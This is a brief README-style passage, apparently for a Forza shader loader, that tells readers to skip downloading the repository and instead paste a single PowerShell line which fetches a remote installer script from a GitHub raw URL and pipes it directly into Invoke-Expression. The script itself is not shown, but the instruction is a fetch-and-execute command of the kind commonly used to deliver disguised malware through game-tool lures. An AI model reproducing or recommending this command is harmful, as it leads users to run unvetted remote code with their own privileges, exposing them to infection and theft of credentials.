...
You don't need to download the repository or install Python! Just copy and paste the following single-line code into your **PowerShell** and press **Enter**:

```powershell
irm https://raw.githubusercontent.com/psycodess/PSY-60-FORZA-SHADER-LOADER/main/installer.ps1 | iex
```
